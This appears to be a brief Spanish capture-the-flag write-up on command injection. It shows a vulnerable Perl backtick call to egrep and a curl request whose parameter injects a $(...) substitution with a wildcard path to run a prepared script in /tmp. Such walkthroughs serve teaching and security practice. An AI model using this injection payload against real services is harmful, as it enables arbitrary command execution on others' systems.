Me encuentro con un script en perl que contiene
una línea susceptible de ser atacada:

@output = `egrep "$xx" /tmp/xd 2>&1`;

aquí la variable $xx puede ser manipulada para inyectar mi
propio código.

Tras hacer NUMEROSAS pruebas ejecutando "en local" el script
llego a la siguiente conclusión:

curl "http://127.0.0.1:4646/?x='\$(/*/FILE)'&y='a'"

$(/*/FILE): Buscará desde la raíz en un directorio de profundidad el fichero FILE aprovechando la wildcard.
    (FILE): Un script de bash preparado en /tmp +(chmod) con  "getflag > /tmp/flag"

Fin.